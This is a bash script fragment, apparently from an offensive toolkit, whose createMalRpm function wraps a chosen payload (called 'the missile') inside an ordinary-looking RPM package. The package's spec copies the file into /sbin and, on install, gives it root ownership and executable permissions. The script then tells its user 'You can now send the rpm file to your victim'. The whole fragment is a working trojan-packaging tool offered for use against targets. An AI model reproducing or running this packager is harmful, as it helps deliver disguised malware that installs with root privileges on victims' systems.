
# rpm packager


_spec(){
    while read line
    do
	$line
    done << EOF > ${HOME}/rpmbuild/SPECS/${fileName}.spec
set -f
echo Name:                                      ${fileName}
echo Version:                                   ${vnumber}
echo Release:                                   1%{?dist}
echo Summary:                                   ${description}
echo BuildArch:                                 noarch

echo License:                                   GPL-2
echo Source0:                                   %{name}-%{version}.tar.gz


echo %description
echo ${description}


echo %prep
echo %setup -q


echo %install
echo mkdir -p \$RPM_BUILD_ROOT/sbin
echo cp -R * \$RPM_BUILD_ROOT/sbin


echo %files
echo /sbin
echo %clean
echo rm -rf \$RPM_BUILD_ROOT


echo %post
echo chown -R root:root /sbin/${fileName}
echo chmod 775 /sbin/${fileName}

EOF
}
createMalRpm() {
    
    while printf "${open}${light}${green}Should i associate the missile with a %s package?[y|n]: ${close}" "${pPackage}" ; \
	  read $opt -e inmissile
    do
	case $inmissile in
	    y)

		which rpm >/dev/null
		[[ $? == 1 ]] && {
		    printf "${open}${bold}${red}%s${close}" "[!]executable for rpm package manager was not found"
		    exit 2;
		}
		
		[[ ! -d "$HOME/rpmbuild" ]] && mkdir -p "$HOME/rpmbuild/{BUILD,BUILDROOT,RPMS,SOURCES,SPECS,SRPMS}"
		
		malwareDir="malware"
		mainlocation=$(pwd)
		cd "$HOME/rpmbuild/SOURCES"
		chk_file
		packagedetails
		cd "$HOME/rpmbuild/SPECS"
		_spec
		cd "$HOME/rpmbuild/SOURCES"
		mkdir "${fileName}-${vnumber}"
		mv "${fileName}" "${fileName}-${vnumber}"
		tar -cvzf "${fileName}-${vnumber}.tar.gz" "${fileName}-${vnumber}"
		rm -rf "${fileName}" "${fileName}-${vnumber}"
		cd "$mainlocation"
		rpmbuild -v -bb "$HOME/rpmbuild/SPECS/${fileName}.spec"
		mv "$HOME/rpmbuild/RPMS/noarch/${fileName}-${vnumber}-1.noarch.rpm" .
		
		if [[ $? == 0 ]];then
		    printf "${open}${light}${green}Ok we are done here..${close}\n"
		    printf "${open}${light}${green}You can now send the rpm file to your victim${close}\n"
		    box3d
		    break
		fi
		    
		printf "${open}${light}${red}Error encountered while building the rpm package${close}\n"
		exit 2
		;;
	    *)
		printf "${open}${light}${red}%s${close}" "Invalid Response" && continue ;;
	esac
    done
}
